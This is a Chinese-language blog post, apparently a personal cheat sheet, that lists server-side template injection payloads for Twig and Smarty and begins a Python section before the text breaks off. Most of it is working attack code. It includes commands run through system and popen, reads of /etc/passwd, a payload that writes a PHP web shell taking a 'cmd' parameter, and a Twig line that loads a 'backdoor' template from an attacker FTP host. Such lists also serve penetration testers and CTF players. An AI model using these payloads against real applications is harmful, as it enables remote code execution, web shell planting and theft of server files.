<!DOCTYPE html>
<html itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
  <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
    
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
    <meta name="robots" content="noodp" />
    <title>SSTI Payload记录 - SmallT40&#39;s Blog</title><meta name="author" content="">
<meta name="description" content="
[toc]
1.PHP中的ssti Twig框架 {{}}:输出 {# 注释 #}:注释 {% %}：逻辑运算 循环： {% for word in words %} {{ word }} {% endfor %}测试用payload:
"><meta name="keywords" content='WEB'>
  <meta itemprop="name" content="SSTI payload记录">
  <meta itemprop="description" content="[toc]
1.PHP中的ssti Twig框架 {{}}:输出 {# 注释 #}:注释 {% %}：逻辑运算 循环： {% for word in words %} {{ word }} {% endfor %}测试用payload:">
  <meta itemprop="datePublished" content="2022-03-29T00:00:00+00:00">
  <meta itemprop="dateModified" content="2022-03-29T00:00:00+00:00">
  <meta itemprop="wordCount" content="2208">
  <meta itemprop="keywords" content="WEB"><meta property="og:url" content="http://localhost:1313/posts/ssti/">
  <meta property="og:site_name" content="SmallT40&#39;s Blog">
  <meta property="og:title" content="SSTI payload记录">
  <meta property="og:description" content="[toc]
1.PHP中的ssti Twig框架 {{}}:输出 {# 注释 #}:注释 {% %}：逻辑运算 循环： {% for word in words %} {{ word }} {% endfor %}测试用payload:">
  <meta property="og:locale" content="zh_CN">
  <meta property="og:type" content="article">
    <meta property="article:section" content="posts">
    <meta property="article:published_time" content="2022-03-29T00:00:00+00:00">
    <meta property="article:modified_time" content="2022-03-29T00:00:00+00:00">
    <meta property="article:tag" content="WEB">

  <meta name="twitter:card" content="summary">
  <meta name="twitter:title" content="SSTI payload记录">
  <meta name="twitter:description" content="[toc]
1.PHP中的ssti Twig框架 {{}}:输出 {# 注释 #}:注释 {% %}：逻辑运算 循环： {% for word in words %} {{ word }} {% endfor %}测试用payload:">
<meta name="application-name" content="FixIt">
<meta name="apple-mobile-web-app-title" content="FixIt"><meta name="theme-color" data-light="#f8f8f8" data-dark="#252627" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" type="text/html" href="http://localhost:1313/posts/ssti/" title="SSTI payload记录 - SmallT40&#39;s Blog" /><link rel="prev" type="text/html" href="http://localhost:1313/posts/vulnhub04/" title="VulnHub_04_Holynix: v1" /><link rel="next" type="text/html" href="http://localhost:1313/posts/springmvc%E5%88%9D%E6%8E%A2/" title="Spring MVC初探" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
    <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
    <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
  {
    "@context": "http://schema.org",
    "@type": "BlogPosting",
    "headline": "SSTI payload记录",
    "inLanguage": "zh-CN",
    "mainEntityOfPage": {
      "@type": "WebPage",
      "@id": "http:\/\/localhost:1313\/posts\/ssti\/"
    },"genre": "posts","keywords": "WEB","wordcount":  2208 ,
    "url": "http:\/\/localhost:1313\/posts\/ssti\/","datePublished": "2022-03-29T00:00:00+00:00","dateModified": "2022-03-29T00:00:00+00:00","publisher": {
      "@type": "Organization",
      "name": ""},"author": {
        "@type": "Person",
        "name": "Author"
      },"description": ""
  }
  </script><script src="/js/head/color-scheme.min.js"></script></head>
  <body data-header-desktop="sticky" data-header-mobile="auto"><div class="wrapper" data-page-style="normal"><header class="desktop animate__faster" id="header-desktop">
  <div class="header-wrapper">
    <div class="header-title">
      <a href="/" title="SmallT40&#39;s Blog"><span class="header-title-text">SmallT40&#39;s Blog</span></a><span class="header-subtitle"></span></div>
    <nav>
      <ul class="menu"><li class="menu-item">
              <a class="menu-link" href="/posts/">文章</a></li><li class="menu-item">
              <a class="menu-link" href="/tags/">标签</a></li><li class="menu-item">
              <a class="menu-link" href="/about/">关于</a></li><li class="menu-item">
              <a class="menu-link" href="/categories/">分类</a></li><li class="menu-item delimiter"></li><li class="menu-item theme-switch" title="Switch Theme">
          <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
        </li></ul>
    </nav>
  </div>
</header><header class="mobile animate__faster" id="header-mobile">
  <div class="header-container">
    <div class="header-wrapper">
      <div class="header-title">
        <a href="/" title="SmallT40&#39;s Blog"><span class="header-title-text">SmallT40&#39;s Blog</span></a><span class="header-subtitle"></span></div>
      <div class="menu-toggle" id="menu-toggle-mobile">
        <span></span><span></span><span></span>
      </div>
    </div>
    <nav>
      <ul class="menu" id="menu-mobile"><li class="menu-item"><a class="menu-link" href="/posts/">文章</a></li><li class="menu-item"><a class="menu-link" href="/tags/">标签</a></li><li class="menu-item"><a class="menu-link" href="/about/">关于</a></li><li class="menu-item"><a class="menu-link" href="/categories/">分类</a></li><li class="menu-item menu-system">
          <span class="menu-system-item theme-switch" title="Switch Theme"><i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i></span></li>
      </ul>
    </nav>
  </div>
</header><main class="container"><aside class="aside-collection animate__animated animate__fadeIn animate__faster" aria-label="Collections"></aside>

  <article class="page single">
    <div class="header"><h1 class="single-title animate__animated animate__flipInX"><span>SSTI Payload记录</span>
      </h1></div><div class="post-meta">
      <div class="post-meta-line"><span class="post-author"><span class="author"><i class="fa-solid fa-user-circle" aria-hidden="true"></i>
      Anonymous</span></span><span class="post-included-in">&nbsp;included in <a href="/categories/technology/" class="post-category" title="Category - Technology"><i class="fa-regular fa-folder fa-fw" aria-hidden="true"></i> Technology</a></span></div><div class="post-meta-line"><span title="published on 2022-03-29 00:00:00"><i class="fa-solid fa-calendar-days fa-fw me-1" aria-hidden="true"></i><time datetime="2022-03-29">2022-03-29</time></span>&nbsp;<span title="2208 words"><i class="fa-solid fa-pencil-alt fa-fw me-1" aria-hidden="true"></i>About 2300 words</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw me-1" aria-hidden="true"></i>5 minutes</span>&nbsp;</div>
    </div><div class="details toc" id="toc-static" data-kept="false">
        <div class="details-summary toc-title">
          <span>Contents</span>
          <span><i class="details-icon fa-solid fa-angle-right" aria-hidden="true"></i></span>
        </div>
        <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
  <ul>
    <li>
      <ul>
        <li><a href="#1php中的ssti">1.PHP中的ssti</a>
          <ul>
            <li><a href="#twig框架">Twig框架</a></li>
            <li><a href="#smarty框架">Smarty框架</a></li>
          </ul>
        </li>
        <li><a href="#2python中的ssti">2.python中的ssti</a>
          <ul>
            <li><a href="#0通用">0.通用</a>
              <ul>
                <li><a href="#os_wrap_close中的popenpy2不行">os._wrap_close中的popen(py2不行)</a></li>
                <li><a href="#os中popen">os中popen</a></li>
                <li><a href="#__import__中ospy2不行"><code>__import__</code>中os(py2不行)</a></li>
              </ul>
            </li>
            <li><a href="#1jinjia2">1.Jinjia2</a>
              <ul>
                <li><a href="#绕过">绕过</a></li>
              </ul>
            </li>
            <li><a href="#2tornado">2.tornado</a></li>
            <li><a href="#3djanjo">3.Djanjo</a></li>
          </ul>
        </li>
        <li><a href="#3java中ssti">3.Java中ssti</a>
          <ul>
            <li><a href="#1velocity">1.Velocity</a></li>
            <li><a href="#2freemarker">2.FreeMarker</a></li>
            <li><a href="#3spring-view-manipulation">3.Spring View Manipulation</a></li>
            <li><a href="#4pebble">4.Pebble</a></li>
            <li><a href="#5jinjava">5.Jinjava</a></li>
          </ul>
        </li>
        <li><a href="#4nodejs中的ssti">4.Nodejs中的SSTI</a>
          <ul>
            <li><a href="#1handlebars">1.Handlebars</a></li>
            <li><a href="#2jsrender">2.JsRender</a>
              <ul>
                <li><a href="#3pugjs">3.PugJs</a></li>
              </ul>
            </li>
          </ul>
        </li>
        <li><a href="#5ruby中ssti">5.Ruby中SSTI</a>
          <ul>
            <li><a href="#1erb">1.ERB</a></li>
            <li><a href="#2slim">2.Slim</a></li>
          </ul>
        </li>
      </ul>
    </li>
  </ul>
</nav></div>
      </div><div class="content" id="content"><p><img loading="lazy" src='/posts/ssti/1344396-20200911174631687-758048107.png' alt="img" height="835" width="732"></p>
<p>[toc]</p>
<h2 id="1php中的ssti" class="heading-element"><span>1.PHP中的ssti</span>
  <a href="#1php%e4%b8%ad%e7%9a%84ssti" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><h3 id="twig框架" class="heading-element"><span>Twig框架</span>
  <a href="#twig%e6%a1%86%e6%9e%b6" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h3><pre tabindex="0"><code>{{}}:输出

{# 注释 #}:注释

{% %}：逻辑运算
循环：
{% for word in words %}
	{{ word }}
{% endfor %}</code></pre><p>测试用payload:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="p">{{</span><span class="mi">2</span><span class="o">*</span><span class="mi">2</span><span class="o">**</span><span class="mi">3</span><span class="p">}}</span> <span class="o">=</span> <span class="mi">16</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span><span class="c1"># 这里要注意的是，#要写成%23，不然会被浏览器当成锚点 #}
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">{{</span><span class="mi">2</span><span class="o">*</span><span class="mi">2</span><span class="o">**</span><span class="mi">3</span><span class="p">}}{</span><span class="o">%</span><span class="mi">23</span><span class="o">%</span><span class="mi">20</span><span class="nx">注释不会显示</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">23</span><span class="p">}</span> <span class="o">=</span> <span class="mi">16</span>
</span></span><span class="line"><span class="cl"><span class="err">$</span><span class="p">{</span><span class="mi">7</span><span class="o">*</span><span class="mi">7</span><span class="p">}</span> <span class="o">=</span> <span class="err">$</span><span class="p">{</span><span class="mi">7</span><span class="o">*</span><span class="mi">7</span><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">{{</span><span class="mi">7</span><span class="o">*</span><span class="s1">&#39;7&#39;</span><span class="p">}}</span> <span class="o">=</span> <span class="mi">49</span>
</span></span><span class="line"><span class="cl"><span class="p">{{</span><span class="mi">1</span><span class="o">/</span><span class="mi">0</span><span class="p">}}</span> <span class="o">=</span> <span class="nx">Error</span>
</span></span><span class="line"><span class="cl"><span class="p">{{</span><span class="nx">foobar</span><span class="p">}}</span> <span class="nx">Nothing</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">{</span><span class="c1"># Get Info #}
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">{{</span><span class="nx">_self</span><span class="p">}}</span> <span class="c1">#(Ref. to current application)
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">{{</span><span class="nx">_self</span><span class="o">.</span><span class="nx">env</span><span class="p">}}</span>
</span></span><span class="line"><span class="cl"><span class="p">{{</span><span class="nx">dump</span><span class="p">(</span><span class="nx">app</span><span class="p">)}}</span>
</span></span><span class="line"><span class="cl"><span class="p">{{</span><span class="nx">app</span><span class="o">.</span><span class="nx">request</span><span class="o">.</span><span class="nx">server</span><span class="o">.</span><span class="nx">all</span><span class="o">|</span><span class="nx">join</span><span class="p">(</span><span class="s1">&#39;,&#39;</span><span class="p">)}}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">{</span><span class="c1"># File read #}
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="s2">&#34;{{&#39;/etc/passwd&#39;|file_excerpt(1,30)}}&#34;</span><span class="o">@</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">{</span><span class="c1"># Exec code #}
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">{{</span><span class="nx">_self</span><span class="o">.</span><span class="nx">env</span><span class="o">.</span><span class="nx">setCache</span><span class="p">(</span><span class="s2">&#34;ftp://attacker.net:2121&#34;</span><span class="p">)}}{{</span><span class="nx">_self</span><span class="o">.</span><span class="nx">env</span><span class="o">.</span><span class="nx">loadTemplate</span><span class="p">(</span><span class="s2">&#34;backdoor&#34;</span><span class="p">)}}</span>
</span></span><span class="line"><span class="cl"><span class="p">{{</span><span class="nx">_self</span><span class="o">.</span><span class="nx">env</span><span class="o">.</span><span class="nx">registerUndefinedFilterCallback</span><span class="p">(</span><span class="s2">&#34;exec&#34;</span><span class="p">)}}{{</span><span class="nx">_self</span><span class="o">.</span><span class="nx">env</span><span class="o">.</span><span class="nx">getFilter</span><span class="p">(</span><span class="s2">&#34;id&#34;</span><span class="p">)}}</span>
</span></span><span class="line"><span class="cl"><span class="p">{{</span><span class="nx">_self</span><span class="o">.</span><span class="nx">env</span><span class="o">.</span><span class="nx">registerUndefinedFilterCallback</span><span class="p">(</span><span class="s2">&#34;system&#34;</span><span class="p">)}}{{</span><span class="nx">_self</span><span class="o">.</span><span class="nx">env</span><span class="o">.</span><span class="nx">getFilter</span><span class="p">(</span><span class="s2">&#34;whoami&#34;</span><span class="p">)}}</span>
</span></span><span class="line"><span class="cl"><span class="o">&lt;</span><span class="c1">#assign ex=&#34;freemarker.template.utility.Execute&#34;?new()&gt; ${ ex(&#34;cat /etc/passwd&#34;) }
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">{{[</span><span class="s1">&#39;id&#39;</span><span class="p">]</span><span class="o">|</span><span class="nx">filter</span><span class="p">(</span><span class="s1">&#39;system&#39;</span><span class="p">)}}</span>
</span></span><span class="line"><span class="cl"><span class="p">{{[</span><span class="s1">&#39;cat\x20/etc/passwd&#39;</span><span class="p">]</span><span class="o">|</span><span class="nx">filter</span><span class="p">(</span><span class="s1">&#39;system&#39;</span><span class="p">)}}</span>
</span></span><span class="line"><span class="cl"><span class="p">{{[</span><span class="s1">&#39;cat$IFS/etc/passwd&#39;</span><span class="p">]</span><span class="o">|</span><span class="nx">filter</span><span class="p">(</span><span class="s1">&#39;system&#39;</span><span class="p">)}}</span>
</span></span><span class="line"><span class="cl"><span class="p">{{[</span><span class="s2">&#34;id&#34;</span><span class="p">]</span><span class="o">|</span><span class="nx">map</span><span class="p">(</span><span class="s2">&#34;system&#34;</span><span class="p">)</span><span class="o">|</span><span class="nx">join</span><span class="p">(</span><span class="s2">&#34;,&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{{[</span><span class="s2">&#34;id&#34;</span><span class="p">,</span> <span class="mi">0</span><span class="p">]</span><span class="o">|</span><span class="nx">sort</span><span class="p">(</span><span class="s2">&#34;system&#34;</span><span class="p">)</span><span class="o">|</span><span class="nx">join</span><span class="p">(</span><span class="s2">&#34;,&#34;</span><span class="p">)}}</span>
</span></span><span class="line"><span class="cl"><span class="p">{{[</span><span class="s2">&#34;id&#34;</span><span class="p">]</span><span class="o">|</span><span class="nx">filter</span><span class="p">(</span><span class="s2">&#34;system&#34;</span><span class="p">)</span><span class="o">|</span><span class="nx">join</span><span class="p">(</span><span class="s2">&#34;,&#34;</span><span class="p">)}}</span>
</span></span><span class="line"><span class="cl"><span class="p">{{[</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">]</span><span class="o">|</span><span class="nx">reduce</span><span class="p">(</span><span class="s2">&#34;system&#34;</span><span class="p">,</span> <span class="s2">&#34;id&#34;</span><span class="p">)</span><span class="o">|</span><span class="nx">join</span><span class="p">(</span><span class="s2">&#34;,&#34;</span><span class="p">)}}</span>
</span></span><span class="line"><span class="cl"><span class="p">{{{</span><span class="s2">&#34;php phpinfo();&#34;</span><span class="o">:</span><span class="s2">&#34;/var/www/html/shell.php&#34;</span><span class="p">}</span><span class="o">|</span><span class="nx">map</span><span class="p">(</span><span class="s2">&#34;file_put_contents&#34;</span><span class="p">)}}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nx">全版本通用payload：</span>
</span></span><span class="line"><span class="cl"><span class="p">{{[</span><span class="s2">&#34;id&#34;</span><span class="p">]</span><span class="o">|</span><span class="nx">map</span><span class="p">(</span><span class="s2">&#34;system&#34;</span><span class="p">)</span><span class="o">|</span><span class="nx">join</span><span class="p">(</span><span class="s2">&#34;,&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{{[</span><span class="s2">&#34;id&#34;</span><span class="p">,</span> <span class="mi">0</span><span class="p">]</span><span class="o">|</span><span class="nx">sort</span><span class="p">(</span><span class="s2">&#34;system&#34;</span><span class="p">)</span><span class="o">|</span><span class="nx">join</span><span class="p">(</span><span class="s2">&#34;,&#34;</span><span class="p">)}}</span>
</span></span><span class="line"><span class="cl"><span class="p">{{[</span><span class="s2">&#34;id&#34;</span><span class="p">]</span><span class="o">|</span><span class="nx">filter</span><span class="p">(</span><span class="s2">&#34;system&#34;</span><span class="p">)</span><span class="o">|</span><span class="nx">join</span><span class="p">(</span><span class="s2">&#34;,&#34;</span><span class="p">)}}</span>
</span></span><span class="line"><span class="cl"><span class="p">{{[</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">]</span><span class="o">|</span><span class="nx">reduce</span><span class="p">(</span><span class="s2">&#34;system&#34;</span><span class="p">,</span> <span class="s2">&#34;id&#34;</span><span class="p">)</span><span class="o">|</span><span class="nx">join</span><span class="p">(</span><span class="s2">&#34;,&#34;</span><span class="p">)}}</span>
</span></span><span class="line"><span class="cl"><span class="p">{{{</span><span class="s2">&#34;&lt;?php phpinfo();&#34;</span><span class="o">:</span><span class="s2">&#34;/var/www/html/shell.php&#34;</span><span class="p">}</span><span class="o">|</span><span class="nx">map</span><span class="p">(</span><span class="s2">&#34;file_put_contents&#34;</span><span class="p">)}}</span></span></span></code></pre></div><h3 id="smarty框架" class="heading-element"><span>Smarty框架</span>
  <a href="#smarty%e6%a1%86%e6%9e%b6" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h3><p>payload：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="c1">//文件读
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">{</span><span class="nx">self</span><span class="o">::</span><span class="na">getStreamVariable</span><span class="p">(</span><span class="s2">&#34;file:///etc/passwd&#34;</span><span class="p">)}</span>
</span></span><span class="line"><span class="cl"><span class="c1">//other
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">{</span><span class="nv">$smarty</span><span class="o">.</span><span class="nx">version</span><span class="p">}</span>  <span class="c1">#获取smarty的版本号
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">{</span><span class="nx">php</span><span class="p">}</span><span class="nx">phpinfo</span><span class="p">();{</span><span class="o">/</span><span class="nx">php</span><span class="p">}</span>  <span class="c1">#执行相应的php代码，在Smarty3版本中已经废弃{php}标签，强烈建议不要使用。在Smarty 3.1，{php}仅在SmartyBC中可用。
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">{</span><span class="k">if</span> <span class="nx">phpinfo</span><span class="p">()}{</span><span class="o">/</span><span class="k">if</span><span class="p">}</span>    <span class="c1"># 执行相应的php代码
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">{</span><span class="nx">self</span><span class="o">::</span><span class="na">getStreamVariable</span><span class="p">(</span><span class="s2">&#34;file:///etc/passwd&#34;</span><span class="p">)}</span> <span class="c1"># 任意文件读取
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">{</span><span class="nx">Smarty_Internal_Write_File</span><span class="o">::</span><span class="na">writeFile</span><span class="p">(</span><span class="nv">$SCRIPT_NAME</span><span class="p">,</span><span class="s2">&#34;&lt;?php passthru(</span><span class="si">$_GET[&#39;cmd&#39;]</span><span class="s2">); ?&gt;&#34;</span><span class="p">,</span><span class="nx">self</span><span class="o">::</span><span class="na">clearConfig</span><span class="p">())}</span> <span class="c1"># 文件写入
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">{</span><span class="nx">system</span><span class="p">(</span><span class="s1">&#39;ls&#39;</span><span class="p">)}</span> <span class="c1"># compatible v3
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">{</span><span class="nx">system</span><span class="p">(</span><span class="s1">&#39;cat index.php&#39;</span><span class="p">)}</span> <span class="c1"># compatible v3
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">{</span><span class="nx">literal</span><span class="p">}</span><span class="nx">alert</span><span class="p">(</span><span class="s1">&#39;xss&#39;</span><span class="p">);{</span><span class="o">/</span><span class="nx">literal</span><span class="p">}</span> <span class="c1"># XSS
</span></span></span></code></pre></div><h2 id="2python中的ssti" class="heading-element"><span>2.python中的ssti</span>
  <a href="#2python%e4%b8%ad%e7%9a%84ssti" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="vm">__class__</span>  <span class="n">返回示例所属的类</span>
</span></span><span class="line"><span class="cl"><span class="vm">__mro__</span>    <span class="n">返回一个类所继承的基类元组</span><span class="err">，</span><span class="n">方法在解析时按照元组的顺序解析</span><span class="err">。</span>
</span></span><span class="line"><span class="cl"><span class="n">__base__</span>   <span class="n">返回一个类所继承的基类</span><span class="p">,</span><span class="n">返回字符串类型</span>    <span class="c1"># __base__和__mro__都是用来寻找基类的</span>
</span></span><span class="line"><span class="cl"><span class="vm">__bases__</span>  <span class="n">元组类型返回</span>
</span></span><span class="line"><span class="cl"><span class="n">__subclasses__</span>   <span class="n">每个新类都保留了子类的引用</span><span class="err">，</span><span class="n">这个方法返回一个类中仍然可用的的引用列表</span>
</span></span><span class="line"><span class="cl"><span class="fm">__init__</span>  <span class="n">类的初始化方法</span>
</span></span><span class="line"><span class="cl"><span class="vm">__globals__</span>  <span class="n">对包含函数全局变量的字典的引用</span></span></span></code></pre></div><p>通用的一些payload，版本不同排序不同</p>
<h3 id="0通用" class="heading-element"><span>0.通用</span>
  <a href="#0%e9%80%9a%e7%94%a8" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h3><h4 id="os_wrap_close中的popenpy2不行" class="heading-element"><span>os._wrap_close中的popen(py2不行)</span>
  <a href="#os_wrap_close%e4%b8%ad%e7%9a%84popenpy2%e4%b8%8d%e8%a1%8c" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h4><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="s2">&#34;&#34;</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="vm">__bases__</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()[</span><span class="mi">128</span><span class="p">]</span><span class="o">.</span><span class="fm">__init__</span><span class="o">.</span><span class="vm">__globals__</span><span class="p">[</span><span class="s1">&#39;popen&#39;</span><span class="p">](</span><span class="s1">&#39;whoami&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;&#34;</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="vm">__bases__</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()[</span><span class="mi">128</span><span class="p">]</span><span class="o">.</span><span class="fm">__init__</span><span class="o">.</span><span class="vm">__globals__</span><span class="o">.</span><span class="n">popen</span><span class="p">(</span><span class="s1">&#39;whoami&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span></span></span></code></pre></div><h4 id="os中popen" class="heading-element"><span>os中popen</span>
  <a href="#os%e4%b8%adpopen" class="heading-mark">
